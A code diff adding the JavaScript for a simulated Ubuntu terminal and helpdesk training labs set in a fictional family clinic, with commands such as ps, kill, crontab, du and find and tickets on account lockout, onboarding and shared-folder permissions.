+  c.out.push('ricardo   '+String(9000+S.tick).padStart(5)+'  0.0  0.1  11500  3300 pts/0    R+   14:21   0:00 ps aux');};
+CMDS.top=(c,a)=>{const L=c.S.procs.slice().sort((x,y)=>y.cpu-x.cpu).slice(0,8);const load=L.reduce((s,p)=>s+p.cpu,0)/100;
+  c.out.push('top - 14:21:07 up 6 days,  3:12,  1 user,  load average: '+load.toFixed(2)+', '+load.toFixed(2)+', '+(load*0.9).toFixed(2),'','    PID USER      %CPU %MEM COMMAND');L.forEach(p=>c.out.push(String(p.pid).padStart(7)+' '+p.user.padEnd(9)+String(p.cpu.toFixed(1)).padStart(5)+String(p.mem.toFixed(1)).padStart(5)+' '+p.cmd.split(' ')[0]));
+  c.info.push('(top is live and interactive on a real system. This is a one-time snapshot.)');};
+function killPid(c,pid){const S=c.S;const i=S.procs.findIndex(p=>p.pid===pid);if(i<0){c.err.push('bash: kill: ('+pid+') - No such process');return 1;}
+  const p=S.procs[i];if(c.user!=='root'&&p.user!==c.user){c.err.push('bash: kill: ('+pid+') - Operation not permitted');tip(c);return 1;}
+  if(p.protect){c.err.push('bash: kill: ('+pid+') - the simulator will not kill '+p.cmd.split(' ')[0]+' (it would break the lab). Pick the suspicious process.');return 1;}
+  S.procs.splice(i,1);S.killed=(S.killed||[]).concat([p.cmd]);S.sinceKill=0;return 0;}
+CMDS.kill=(c,a)=>{const pids=[];for(let i=0;i<a.length;i++){const x=a[i];if(x==='-s'||x==='-n'){i++;continue;}if(x.startsWith('-'))continue;pids.push(x);}
+  if(!pids.length){c.err.push('kill: usage: kill [-9] PID');return 2;}let code=0;for(const x of pids){if(!/^\d+$/.test(x)){c.err.push('bash: kill: '+x+': arguments must be process or job IDs');code=1;continue;}if(killPid(c,+x))code=1;}return code;};
+CMDS.pkill=(c,a)=>{const n=a.filter(x=>!x.startsWith('-'))[0];if(!n){c.err.push('usage: pkill NAME');return 2;}const m=c.S.procs.filter(p=>p.cmd.includes(n)&&!p.protect);if(!m.length)return 1;let code=0;m.forEach(p=>{if(killPid(c,p.pid))code=1;});return code;};
+CMDS.killall=CMDS.pkill;
+/* ----- cron ----- */
+CMDS.crontab=(c,a)=>{const o=pa(a,['u']);const S=c.S;const t=o.v.u||c.user;
+  if(o.v.u&&c.user!=='root'&&o.v.u!==c.user){c.err.push('crontab: must be privileged to use -u');tip(c);return 1;}
+  if(o.f.has('l')){const t2=S.crontabs[t];if(t2==null){c.err.push('no crontab for '+t);return 1;}c.out.push(...linesOf(t2));return 0;}
+  if(o.f.has('r')){if(S.crontabs[t]==null){c.err.push('no crontab for '+t);return 1;}delete S.crontabs[t];return 0;}
+  if(o.f.has('e')){c.res.action={type:'edit',crontab:t,path:'crontab for '+t,content:S.crontabs[t]||'# m h dom mon dow command\n'};return 0;}
+  c.err.push('usage: crontab [-u USER] -l | -e | -r');return 1;};
+/* ----- editor ----- */
+function editCmd(c,a,name){const f=a.filter(x=>!x.startsWith('-'))[0];if(!f){c.err.push('usage: edit FILE');return 1;}const p=P(c,f),n=node(c.S,p);
+  if(n&&n.t==='d'){c.err.push(name+': '+f+' is a directory');return 1;}
+  if(n&&!can(c.S,c.user,p,4)){return denied(c,name+': '+f+': Permission denied');}
+  if(n&&!can(c.S,c.user,p,2)||!n&&!canCreate(c.S,c.user,p)){c.err.push(name+': '+f+': Permission denied (you can read it but not save it)');tip(c,'Tip: config files belong to root. Open it with sudo edit '+f);return 1;}
+  if(n&&n.sz>MB){c.err.push(name+': '+f+' is too large to open in an editor ('+human(n.sz)+').');return 1;}
+  if(name!=='edit')c.info.push('('+name+' opens the simple editor in this simulator.)');
+  c.res.action={type:'edit',path:p,user:c.user,content:n?n.c:''};return 0;}
+['edit','nano','vi','vim'].forEach(k=>CMDS[k]=(c,a)=>editCmd(c,a,k));
+function saveEdit(S,act,text){if(text&&!text.endsWith('\n'))text+='\n';
+  if(act.crontab){S.crontabs[act.crontab]=text;return 'crontab: installing new crontab';}
+  const e=writeFile(S,act.user,act.path,text,false);return e?'edit: '+e:'Saved '+act.path;}
+/* ----- disk ----- */
+function diskUsed(S){let u=S.disk.base;for(const k in S.fs){const n=S.fs[k];if(n.t==='f'&&n.sz!=null)u+=n.sz;}return u;}
+CMDS.df=(c,a)=>{const h=a.join('').includes('h');const S=c.S;const T=S.disk.total,U=diskUsed(S),A=Math.max(T-U,0);const pct=Math.ceil(U/T*100)+'%';
+  const f=v=>h?human(v):String(Math.round(v/1024));
+  c.out.push('Filesystem      '+(h?'Size':'1K-blocks').padStart(h?5:10)+(h?'  Used':'      Used')+(h?' Avail':'     Avail')+' Use% Mounted on');
+  c.out.push('/dev/sda1       '+f(T).padStart(h?5:10)+' '+f(U).padStart(h?5:9)+' '+f(A).padStart(h?5:9)+' '+pct.padStart(4)+' /');
+  c.out.push('tmpfs           '+f(1.9*GB).padStart(h?5:10)+' '+(h?'0':'0').padStart(h?5:9)+' '+f(1.9*GB).padStart(h?5:9)+'   0% /dev/shm');
+  c.out.push('/dev/sda15      '+f(105*MB).padStart(h?5:10)+' '+f(6.1*MB).padStart(h?5:9)+' '+f(99*MB).padStart(h?5:9)+'   6% /boot/efi');};
+function walk(c,start,fn,maxd){/* returns list of paths in order, reports unreadable dirs */const S=c.S;const out=[];
+  const rec=(p,d)=>{const n=S.fs[p];out.push({p,d});if(n.t!=='d')return;if(c.user!=='root'&&!can(S,c.user,p,5)){fn&&fn(p);return;}if(maxd!=null&&d>=maxd)return;children(S,p).forEach(x=>rec(J(p,x),d+1));};
+  rec(start,0);return out;}
+function treeSize(c,p){let t=0;const S=c.S;const rec=q=>{const n=S.fs[q];t+=n.t==='f'?Math.ceil(fsize(n)/4096)*4096:4096;if(n.t==='d'&&(c.user==='root'||can(S,c.user,q,5)))children(S,q).forEach(x=>rec(J(q,x)));};rec(p);return t;}
+CMDS.du=(c,a)=>{const o=pa(a,['d','max-depth']);const h=o.f.has('h'),s=o.f.has('s');const md=o.v.d!=null?+o.v.d:o.v['max-depth']!=null?+o.v['max-depth']:null;
+  const f=v=>h?human(v):String(Math.ceil(v/1024));let code=0;const S=c.S;let grand=0;
+  for(const t of (o.pos.length?o.pos:['.'])){const p=P(c,t),n=node(S,p);if(!n){c.err.push("du: cannot access '"+t+"': No such file or directory");code=1;continue;}
+    const bad=[];walk(c,p,q=>bad.push(q));bad.forEach(q=>{c.err.push("du: cannot read directory '"+(t==='.'?'.':t)+q.slice(p.length)+"': Permission denied");code=1;});
+    if(bad.length&&c.user!=='root')tip(c);
+    const disp=q=>q===p?t:t.replace(/\/$/,'')+(p==='/'?q:q.slice(p.length));
+    if(s||n.t==='f'){const v=treeSize(c,p);grand+=v;c.out.push(f(v)+'\t'+t);continue;}
+    const list=walk(c,p,null,md).filter(x=>S.fs[x.p].t==='d'||o.f.has('a'));list.sort((x,y)=>y.p.length-x.p.length||0);
+    const ordered=walk(c,p,null,md).filter(x=>S.fs[x.p].t==='d'||o.f.has('a')).reverse();ordered.forEach(x=>c.out.push(f(treeSize(c,x.p))+'\t'+disp(x.p)));grand+=treeSize(c,p);}
+  if(o.f.has('c'))c.out.push(f(grand)+'\ttotal');return code;};
+CMDS.find=(c,a)=>{const S=c.S;const starts=[];let i=0;while(i<a.length&&!a[i].startsWith('-')&&a[i]!=='!'){starts.push(a[i]);i++;}if(!starts.length)starts.push('.');
+  const tests=[];let del=false,execA=null,maxd=null;
+  for(;i<a.length;i++){const x=a[i],v=a[i+1];
+    if(x==='-name'||x==='-iname'){const re=globRe(v||'',true);const ci=x==='-iname';tests.push((p)=>ci?new RegExp(re.source,'i').test(baseName(p)):re.test(baseName(p)));i++;}
+    else if(x==='-type'){tests.push(p=>S.fs[p].t===(v==='d'?'d':'f'));i++;}
+    else if(x==='-size'){const m=(v||'').match(/^([+-]?)(\d+)([ckMGb]?)$/);if(!m){c.err.push("find: invalid argument '"+v+"' to -size (examples: -size +100M, -size +1G)");return 1;}
+      const unit={c:1,k:KB,M:MB,G:GB,b:512,'':512}[m[3]];const nn=+m[2];tests.push(p=>{const n=S.fs[p];if(n.t!=='f')return false;const u=Math.ceil(fsize(n)/unit);return m[1]==='+'?u>nn:m[1]==='-'?u<nn:u===nn;});i++;}
+    else if(x==='-user'){tests.push(p=>S.fs[p].o===v);i++;}
+    else if(x==='-group'){tests.push(p=>S.fs[p].g===v);i++;}
+    else if(x==='-maxdepth'){maxd=+v;i++;}
+    else if(x==='-mtime'||x==='-mmin'||x==='-newer'||x==='-perm'){i++;}
+    else if(x==='-delete')del=true;
+    else if(x==='-exec'){const e=[];i++;while(i<a.length&&a[i]!==';'&&a[i]!=='+'){e.push(a[i]);i++;}execA=e;}
+    else if(x==='-print'||x==='-ls'){}
+    else{c.err.push("find: unknown predicate '"+x+"'. Supported: -name, -iname, -type, -size, -user, -maxdepth, -delete, -exec");return 1;}}
+  let code=0;
+  for(const st of starts){const p=P(c,st);if(!node(S,p)){c.err.push("find: '"+st+"': No such file or directory");code=1;continue;}
+    const bad=[];const L=walk(c,p,q=>bad.push(q),maxd);
+    const disp=q=>q===p?st:st.replace(/\/$/,'')+(p==='/'?q:q.slice(p.length));
+    for(const x of L){if(!S.fs[x.p])continue;if(tests.every(t=>t(x.p))){
+      if(execA){const args=execA.map(y=>y==='{}'?x.p:y);const sub=Object.assign({},c,{args,out:c.out,err:c.err});exec(sub);}
+      else if(del){if(canDelete(S,c.user,x.p)){if(S.fs[x.p].t==='d')descendants(S,x.p).forEach(k=>delete S.fs[k]);delete S.fs[x.p];}else denied(c,"find: cannot delete '"+disp(x.p)+"': Permission denied");}
+      else c.out.push(disp(x.p));}}
+    bad.forEach(q=>{c.err.push("find: '"+disp(q)+"': Permission denied");code=1;});if(bad.length&&c.user!=='root')tip(c);}
+  return code;};
+/* ----- misc ----- */
+const HELP=[
+['Files','ls [-l] [-a] [-h], cd, pwd, cat, head, tail [-n N], grep [-i] [-c] [-v] [-n] [-o], wc -l, sort, uniq -c, awk, cut, echo, touch, mkdir, cp, mv, rm [-r], stat, find (-name, -size, -type), edit FILE (also nano/vi)'],
+['Pipes and output','cmd | grep x,  echo \'text\' > file (overwrite),  echo \'text\' >> file (append),  cmd | sudo tee -a file'],
+['Users and permissions','whoami, id, groups, getent, useradd [-m] [-G], usermod -aG, userdel, groupadd, passwd [-S|-l|-u|-e], chage -d 0 / -l, faillock --user X [--reset], chmod, chown, chgrp, sudo, sudo -u USER CMD, sudo -i'],
+['Disk','df -h, du -sh PATH, du -h --max-depth=1 PATH, find / -size +1G'],
+['Services and logs','systemctl status|start|stop|restart|enable NAME, systemctl --failed, journalctl -u NAME [-n N], nginx -t'],
+['Network','ping, nslookup, dig, host, curl [-I], ss -tlnp, ip a, ip route, hostname'],
+['Processes and cron','ps aux, ps -ef, top, kill [-9] PID, pkill NAME, crontab [-u USER] -l | -e | -r'],
+['Terminal','clear, history, Up and Down keys for history, Tab to complete paths, date, uptime, uname -a, exit']];
+CMDS.help=c=>{c.out.push('Commands available in this simulator:','');HELP.forEach(h=>{c.out.push(h[0]+':','  '+h[1],'');});c.out.push('Admin tasks need sudo in front, just like on a real server.');};
+CMDS.clear=c=>{c.res.clear=true;};
+CMDS.history=c=>{c.S.hist.forEach((h,i)=>c.out.push(String(i+1).padStart(5)+'  '+h));};
+CMDS.date=c=>{c.out.push('Sun Sep 27 14:21:07 CDT 2026');};
+CMDS.uptime=c=>{c.out.push(' 14:21:07 up 6 days,  3:12,  1 user,  load average: 0.31, 0.27, 0.22');};
+CMDS.uname=(c,a)=>{c.out.push(a.includes('-a')?'Linux '+c.S.host+' 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux':'Linux');};
+CMDS.exit=c=>{if(c.S.asRoot){c.S.asRoot=false;c.out.push('logout');return 0;}c.info.push('This is a practice terminal. Use the Dashboard button to leave the lab.');};
+CMDS.logout=CMDS.exit;
+CMDS.su=(c,a)=>{const u=a.filter(x=>x!=='-'&&x!=='-l')[0]||'root';if(c.user==='root'){if(u==='root'){c.S.asRoot=true;return 0;}}
+  c.out.push('Password: ');c.err.push('su: Authentication failure');c.info.push(u==='root'?'Tip: use sudo -i to become root, or just put sudo in front of a command.':'Tip: to test access as another user, run: sudo -u '+u+' COMMAND   (for example sudo -u '+u+' ls /some/folder)');return 1;};
+CMDS.which=(c,a)=>{let code=0;a.forEach(x=>{if(CMDS[x])c.out.push('/usr/bin/'+x);else code=1;});return code;};
+CMDS.man=(c,a)=>{const x=a[0];const h=HELP.find(r=>r[1].includes(x));c.out.push('Manual pages are not included offline.'+(h?' '+x+' is listed under "'+h[0]+'" in help.':''));c.info.push('Try: help');};
+CMDS.true=()=>0;CMDS.false=()=>1;
+CMDS.last=c=>{const t=c.S.fs['/var/log/auth.log'];const L=t?linesOf(t.c).filter(l=>/Accepted/.test(l)):[];if(!L.length){c.out.push('wtmp begins Sun Sep 20 00:00:01 2026');return 0;}
+  L.reverse().forEach(l=>{const m=l.match(/for (\S+) from (\S+)/);if(m)c.out.push(m[1].padEnd(9)+'pts/0        '+m[2].padEnd(16)+l.slice(0,15)+'   still logged in');});};
+/* tab completion */
+function complete(S,line){const m=line.match(/^(.*?)(\S*)$/);const pre=m[1],word=m[2];
+  if(!pre.trim()){const cand=Object.keys(CMDS).filter(k=>k.startsWith(word));if(cand.length===1)return cand[0]+' ';const cp=commonPrefix(cand);if(cp.length>word.length)return cp;return cand.length?{line,list:cand}:line;}
+  const slash=word.lastIndexOf('/');const dirPart=slash>=0?word.slice(0,slash+1):'';const base=slash>=0?word.slice(slash+1):word;
+  const dir=normPath(S.cwd,dirPart||'.',homeOf(S,curUser(S)));if(!S.fs[dir]||S.fs[dir].t!=='d')return line;
+  const cand=children(S,dir).filter(n=>n.startsWith(base)&&(base.startsWith('.')||!n.startsWith('.')));if(!cand.length)return line;
+  if(cand.length===1){const full=J(dir,cand[0]);return pre+dirPart+cand[0]+(S.fs[full].t==='d'?'/':' ');}
+  const cp=commonPrefix(cand);if(cp.length>base.length)return pre+dirPart+cp;return {line,list:cand};}
+function commonPrefix(a){if(!a.length)return '';let p=a[0];for(const x of a)while(!x.startsWith(p))p=p.slice(0,-1);return p;}
+/* ===== Lab worlds ===== */
+const EHR_HTML='<!doctype html>\n<html><head><title>Westside EHR - Sign in</title></head>\n<body><h1>Westside Family Clinic EHR</h1><form action="/login">...</form></body></html>';
+const LABS_HTML='<!doctype html>\n<html><head><title>Lab Results Portal</title></head>\n<body><h1>Westside Lab Results</h1><p>Sign in with your clinic account.</p></body></html>';
+const PORTAL_HTML='<!doctype html>\n<html><head><title>Westside Patient Portal</title></head>\n<body><h1>Welcome to the Westside Family Clinic Patient Portal</h1></body></html>';
+function U(uid,o){return Object.assign({uid,pg:null,groups:[],gecos:'',home:null,shell:'/bin/bash',locked:false,pw:true,fails:[],mustChange:false},o||{});}
+function baseState(host){
+  const S={host,me:'ricardo',asRoot:false,cwd:'/home/ricardo',hist:[],tick:0,fs:{},users:{},groups:{root:0,adm:4,sudo:27,shadow:42,users:100,'www-data':33,syslog:104,ricardo:1000},
+    services:{},procs:[],crontabs:{},journal:{},disk:{total:50*GB,base:11.2*GB},answers:{},deny:5};
+  S.users['www-data']=U(33,{pg:'www-data',home:'/var/www',shell:'/usr/sbin/nologin'});
+  S.users.syslog=U(104,{pg:'syslog',home:'/home/syslog',shell:'/usr/sbin/nologin'});
+  S.users.ricardo=U(1000,{pg:'ricardo',groups:['adm','sudo'],gecos:'Ricardo Castrejon,,,',home:'/home/ricardo'});
+  ['/','/bin','/usr','/usr/bin','/usr/local','/usr/local/bin','/etc','/home','/srv','/opt','/var','/var/lib','/var/www','/var/backups','/run'].forEach(d=>mkd(S,d));
+  mkd(S,'/root',{m:0o700});mkd(S,'/tmp',{m:0o1777});mkd(S,'/var/log',{g:'syslog',m:0o775});
+  mkd(S,'/home/ricardo',{o:'ricardo',m:0o750});
+  mkf(S,'/home/ricardo/.bashrc','# ~/.bashrc\nalias ll="ls -la"\n',{o:'ricardo'});
+  mkf(S,'/etc/hostname',host+'\n');
+  mkf(S,'/etc/hosts','127.0.0.1   localhost\n127.0.1.1   '+host+'\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\n');
+  mkf(S,'/etc/resolv.conf','# Managed by the clinic network team\nnameserver 10.0.0.2\nsearch westside.local\n');
+  mkf(S,'/etc/os-release','PRETTY_NAME="Ubuntu 24.04.1 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\n');
+  mkf(S,'/etc/passwd','');mkf(S,'/etc/group','');
+  mkf(S,'/etc/shadow','(password hashes are not shown in this simulator)\n',{g:'shadow',m:0o640});
+  mkf(S,'/var/log/syslog','Sep 27 08:00:01 '+host+' systemd[1]: Started cron.service - Regular background program processing daemon.\nSep 27 08:00:02 '+host+' rsyslogd: [origin software="rsyslogd"] start\nSep 27 08:00:03 '+host+' systemd[1]: Started ssh.service - OpenBSD Secure Shell server.\n',{o:'syslog',g:'adm',m:0o640});
+  mkf(S,'/var/log/auth.log','Sep 27 08:40:12 '+host+' sshd[1390]: Accepted publickey for ricardo from 10.0.0.60 port 52114 ssh2: ED25519 SHA256:q1w2e3\nSep 27 08:40:12 '+host+' sshd[1390]: pam_unix(sshd:session): session opened for user ricardo(uid=1000) by (uid=0)\n',{o:'syslog',g:'adm',m:0o640});
+  S.services.ssh={desc:'OpenBSD Secure Shell server',active:true,ports:[22],proc:'sshd',pid:812};
+  S.services.cron={desc:'Regular background program processing daemon',active:true,proc:'cron',pid:640};
+  S.services.rsyslog={desc:'System Logging Service',active:true,proc:'rsyslogd',pid:590};
+  S.journal.ssh=['Sep 27 08:00:03 '+host+' systemd[1]: Starting ssh.service - OpenBSD Secure Shell server...','Sep 27 08:00:03 '+host+' sshd[812]: Server listening on 0.0.0.0 port 22.','Sep 27 08:00:03 '+host+' systemd[1]: Started ssh.service - OpenBSD Secure Shell server.'];
+  S.journal.cron=['Sep 27 08:00:01 '+host+' systemd[1]: Started cron.service - Regular background program processing daemon.'];
+  S.journal.rsyslog=['Sep 27 08:00:02 '+host+' systemd[1]: Started rsyslog.service - System Logging Service.'];
+  S.procs=[{pid:1,user:'root',cpu:0.0,mem:0.3,cmd:'/sbin/init',protect:true},{pid:590,user:'syslog',cpu:0.0,mem:0.2,cmd:'/usr/sbin/rsyslogd -n -iNONE',stat:'Ssl'},{pid:640,user:'root',cpu:0.0,mem:0.1,cmd:'/usr/sbin/cron -f -P',protect:true},
+    {pid:812,user:'root',cpu:0.0,mem:0.2,cmd:'sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups',protect:true},{pid:1398,user:'ricardo',cpu:0.0,mem:0.1,cmd:'sshd: ricardo@pts/0',stat:'S',start:'08:40',protect:true},{pid:1402,user:'ricardo',cpu:0.0,mem:0.1,cmd:'-bash',tty:'pts/0',start:'08:40',protect:true}];
+  S.net={myip:'10.0.0.14',gw:'10.0.0.1',dns:{'10.0.0.2':'internal','8.8.8.8':'public','1.1.1.1':'public'},
+    internal:{'ehr.westside.local':'10.0.0.25','labs.westside.local':'10.0.0.30','fileserver.westside.local':'10.0.0.20','dc01.westside.local':'10.0.0.2','portal.westside.local':'10.0.0.14','printer-frontdesk.westside.local':'10.0.0.40'},
+    pub:{'google.com':'142.250.190.78','www.google.com':'142.250.190.78','example.com':'93.184.215.14','github.com':'140.82.112.3'},
+    alive:{'10.0.0.1':{ping:true,ms:0.4},'10.0.0.2':{ping:true,ms:0.5},'10.0.0.20':{ping:true},'10.0.0.25':{ping:true,http:EHR_HTML},'10.0.0.30':{ping:true,http:LABS_HTML},'10.0.0.40':{ping:true,ms:1.8},
+      '142.250.190.78':{ping:true,ttl:117,ms:12.4,http:'<!doctype html><html><head><title>Google</title></head><body>Search</body></html>'},'93.184.215.14':{ping:true,ttl:56,ms:18.2,http:'<!doctype html>\n<html><head><title>Example Domain</title></head><body><h1>Example Domain</h1></body></html>'},
+      '140.82.112.3':{ping:true,ttl:52,ms:21.7,http:'<!doctype html><html><head><title>GitHub</title></head></html>'},'8.8.8.8':{ping:true,ttl:117,ms:11.3},'1.1.1.1':{ping:true,ttl:58,ms:9.8}}};
+  return S;}
+function addUser(S,name,uid,o){S.groups[name]=uid;S.users[name]=U(uid,Object.assign({pg:name,home:'/home/'+name},o||{}));mkd(S,'/home/'+name,{o:name,m:0o750});}
+function authLine(S,t,pid,msg){return 'Sep 27 '+t+' '+S.host+' sshd['+pid+']: '+msg;}
+function hasLine(S,p,re){const n=S.fs[p];return !!n&&re.test(n.c);}
+const LABS=[];
+/* ---------- Lab 1: locked out ---------- */
+LABS.push({id:1,tid:'WFC-1041',cat:'hd',pri:'P2',title:'Front desk user locked out',summary:'Jenna Lopez cannot sign in after too many password attempts.',host:'wfc-app01',
+ requester:'Jenna Lopez, Front Desk',
+ setup(){const S=baseState(this.host);S.groups.frontdesk=1103;S.groups.nurses=1101;
+  addUser(S,'jlopez',1001,{gecos:'Jenna Lopez',groups:['frontdesk']});addUser(S,'mkim',1002,{gecos:'Min Kim',groups:['nurses']});
+  const src='10.0.0.51';const times=['08:49:58','08:50:14','08:50:31','08:50:49','08:51:02','08:51:40'];
+  S.users.jlopez.fails=times.map(t=>({when:'2026-09-27 '+t,src}));S.users.mkim.fails=[{when:'2026-09-27 07:12:09',src:'10.0.0.53'}];
+  const L=[S.fs['/var/log/auth.log'].c.trim()];times.forEach((t,i)=>L.push(authLine(S,t,2100+i,'Failed password for jlopez from '+src+' port '+(50110+i)+' ssh2')));
+  L.push(authLine(S,'08:51:02',2104,'pam_faillock(sshd:auth): Consecutive login failures for user jlopez account temporarily locked'));
+  S.fs['/var/log/auth.log'].c=L.join('\n')+'\n';return S;},
+ brief:`<p><b>Ticket WFC-1041</b> from Jenna Lopez (Front Desk), priority P2.</p>
+<p>"Hi IT, I came back from vacation and could not remember my new password. I tried a few times and now it says my account is locked. Patients are checking in, please help!"</p>
+<p>You verified her identity by calling her desk phone. Clinic policy for lockouts:</p>
+<ul><li>Clear the lockout on the Linux app server <code>wfc-app01</code>.</li><li>Force Jenna to choose a new password at her next login.</li><li>Do not change anything for other users.</li></ul>
+<p class="muted">Account name: <code>jlopez</code>. You are logged in as <code>ricardo</code> with sudo rights.</p>`,
+ hints:['Start by confirming the problem. Failed logins are recorded in <code>/var/log/auth.log</code>. Try <code>grep jlopez /var/log/auth.log</code>.',
+  'The lockout comes from pam_faillock. View her failure count with <code>sudo faillock --user jlopez</code>.',
+  'Clear the counter with <code>sudo faillock --user jlopez --reset</code>. Note: <code>passwd -u</code> removes a different kind of lock (a locked password), so it will not help here.',
+  'Force a new password at next login with <code>sudo chage -d 0 jlopez</code>, then confirm with <code>sudo chage -l jlopez</code>.'],
+ check(S){const p=[],U=S.users.jlopez;if(!U)return {problems:['The account jlopez no longer exists. Press Reset and try again.']};
+  if(U.fails.length>=S.deny)p.push('jlopez still has '+U.fails.length+' failed attempts recorded by faillock, so the login is still blocked. (passwd -u does not clear this counter.)');
+  if(U.locked)p.push('jlopez has a locked password (passwd -S shows L). Unlock it with sudo passwd -u jlopez.');
+  if(!U.mustChange)p.push('jlopez is not required to change her password at next login. Use sudo chage -d 0 jlopez. If you ran passwd after chage, run chage again, because setting a password clears that flag.');
+  if(S.users.mkim&&!S.users.mkim.fails.length)p.push('Note: you also reset mkim\'s failure history. It is harmless here, but only touch the account in the ticket.');
+  return {problems:p.filter(x=>!x.startsWith('Note')),notes:p.filter(x=>x.startsWith('Note'))};},
+ resume:'Hands-on lab (simulated Ubuntu server): resolved an account lockout ticket by reviewing failed logins in auth.log, clearing the pam_faillock tally, and enforcing a password change at next login with chage.',
+ learned:`<p><b>faillock</b> counts failed logins. After too many (here 5), PAM blocks the account for a while. <code>faillock --user NAME --reset</code> clears it.</p><p><b>passwd -l / -u</b> lock and unlock the password itself (an exclamation mark in /etc/shadow). It is a different lock, so knowing which one you face saves time.</p><p><b>chage -d 0</b> sets "last password change" to the start of time, so the user must pick a new password at next login. Always verify identity before unlocking, and document what you did in the ticket.</p>`,
+ solve:['grep jlopez /var/log/auth.log','sudo faillock --user jlopez','sudo faillock --user jlopez --reset','sudo chage -d 0 jlopez','sudo chage -l jlopez']});
+/* ---------- Lab 2: onboarding ---------- */
+LABS.push({id:2,tid:'WFC-1042',cat:'hd',pri:'P3',title:'New hire onboarding',summary:'Create an account for a new nurse, with the right groups and a private home folder.',host:'wfc-app01',
+ requester:'Priya Shah, HR',
+ setup(){const S=baseState(this.host);Object.assign(S.groups,{nurses:1101,scheduling:1102,frontdesk:1103,billing:1104});
+  addUser(S,'jlopez',1001,{gecos:'Jenna Lopez',groups:['frontdesk','scheduling']});addUser(S,'aperez',1002,{gecos:'Ana Perez',groups:['nurses','scheduling']});
+  mkf(S,'/home/ricardo/onboarding-form.txt','WESTSIDE FAMILY CLINIC - NEW HIRE IT REQUEST\nName:        David Nguyen\nRole:        Registered Nurse\nStart date:  Monday Sep 28 2026\nUsername:    dnguyen\nGroups:      nurses, scheduling\nShell:       /bin/bash\nNotes:       Home folder must be private (only David can read it).\n             Give him a temporary password and require a change at first login.\n',{o:'ricardo'});return S;},
+ brief:`<p><b>Ticket WFC-1042</b> from Priya Shah (HR), priority P3.</p><p>"David Nguyen starts Monday as a Registered Nurse. Please set up his Linux account on wfc-app01 so he can use the charting tools. The request form is in your home folder."</p>
+<p>Requirements (also in <code>~/onboarding-form.txt</code>):</p><ul><li>Username <code>dnguyen</code>, full name David Nguyen, shell <code>/bin/bash</code></li><li>Home folder <code>/home/dnguyen</code> that only he can access (permissions 700)</li><li>Member of groups <code>nurses</code> and <code>scheduling</code>, and nothing extra</li><li>Temporary password set, and he must change it at first login</li></ul>`,
+ hints:['Read the form with <code>cat ~/onboarding-form.txt</code>. Check how an existing nurse is set up with <code>id aperez</code>.',
+  '<code>useradd</code> creates users. <code>-m</code> makes the home folder, <code>-s</code> sets the shell, <code>-c</code> the full name, <code>-G</code> extra groups (comma separated, no spaces).',
+  'Try <code>sudo useradd -m -s /bin/bash -c "David Nguyen" -G nurses,scheduling dnguyen</code>, then <code>ls -ld /home/dnguyen</code>. The default is 755, which lets everyone look inside.',
+  'Finish with <code>sudo chmod 700 /home/dnguyen</code>, <code>sudo passwd dnguyen</code>, then <code>sudo chage -d 0 dnguyen</code> (in that order).'],
+ check(S){const p=[],u=S.users.dnguyen;if(!u)return {problems:['User dnguyen does not exist yet. Create it with useradd.']};
+  const h=S.fs['/home/dnguyen'];const g=userGroups(S,'dnguyen');
+  if(!h)p.push('/home/dnguyen does not exist. Use useradd -m, or create it with mkdir and give it to dnguyen with chown.');
+  else{if(h.o!=='dnguyen')p.push('/home/dnguyen is owned by '+h.o+', it should be owned by dnguyen.');if((h.m&0o777)!==0o700)p.push('/home/dnguyen has permissions '+octal(h.m&0o777)+'. Policy says 700 (only David). Use sudo chmod 700 /home/dnguyen.');}
+  ['nurses','scheduling'].forEach(x=>{if(!g.includes(x))p.push('dnguyen is not in the '+x+' group. Use sudo usermod -aG '+x+' dnguyen.');});
+  const extra=g.filter(x=>x!=='dnguyen'&&x!==u.pg&&!['nurses','scheduling'].includes(x));if(extra.length)p.push('dnguyen is in extra group(s): '+extra.join(', ')+'. Least privilege means only what the form asks for.');
+  if(u.shell!=='/bin/bash')p.push('Login shell is '+u.shell+'. The form asks for /bin/bash (sudo usermod -s /bin/bash dnguyen).');
+  if(!u.pw)p.push('dnguyen has no password yet. Set a temporary one with sudo passwd dnguyen.');
+  if(!u.mustChange)p.push('dnguyen is not forced to change the password at first login. Run sudo chage -d 0 dnguyen (after passwd).');
+  return {problems:p};},
+ resume:'Hands-on lab (simulated Ubuntu server): onboarded a new user from an HR request by creating the account with useradd, assigning least-privilege groups, securing the home directory (700), and enforcing a first-login password change.',
+ learned:`<p><b>useradd -m -s -c -G</b> builds an account in one line. Without <code>-m</code> there is no home folder, a classic onboarding mistake.</p><p><b>usermod -aG</b> adds groups. Leaving out <code>-a</code> replaces all groups, which can silently remove access.</p><p><b>chmod 700</b> on a home folder means only the owner can read, write or enter it. In a clinic this protects anything a user saves.</p><p>Order matters: <code>passwd</code> then <code>chage -d 0</code>, because setting a password clears the force-change flag.</p>`,
+ solve:['cat ~/onboarding-form.txt','sudo useradd -m -s /bin/bash -c "David Nguyen" -G nurses,scheduling dnguyen','sudo chmod 700 /home/dnguyen','sudo passwd dnguyen','sudo chage -d 0 dnguyen','id dnguyen','ls -ld /home/dnguyen']});
+/* ---------- Lab 3: shared folder ---------- */
+LABS.push({id:3,tid:'WFC-1043',cat:'hd',pri:'P2',title:'Permission denied on shared folder',summary:'The billing team cannot open their shared folder.',host:'wfc-files01',
+ requester:'Maria Santos, Billing',
+ setup(){const S=baseState(this.host);Object.assign(S.groups,{nurses:1101,frontdesk:1103,billing:1104});
+  addUser(S,'maria',1001,{gecos:'Maria Santos'});addUser(S,'tchen',1002,{gecos:'Tom Chen',groups:['billing']});addUser(S,'jlopez',1003,{gecos:'Jenna Lopez',groups:['frontdesk']});
+  mkd(S,'/srv/shared');mkd(S,'/srv/shared/frontdesk',{g:'frontdesk',m:0o2770});mkf(S,'/srv/shared/frontdesk/phone-list.txt','Front desk extensions\n',{g:'frontdesk',m:0o660});
+  mkd(S,'/srv/shared/billing',{m:0o700});
+  mkf(S,'/srv/shared/billing/claims-queue.csv','claim_id,patient_id,payer,status\n88121,P-2231,BlueCross,pending\n',{m:0o660});
+  mkf(S,'/srv/shared/billing/invoices-2026-09.xlsx','(spreadsheet)',{m:0o660,sz:48213});
+  mkf(S,'/srv/shared/billing/README.txt','Billing team shared folder. Contains PHI. Billing group only.\n',{m:0o640});
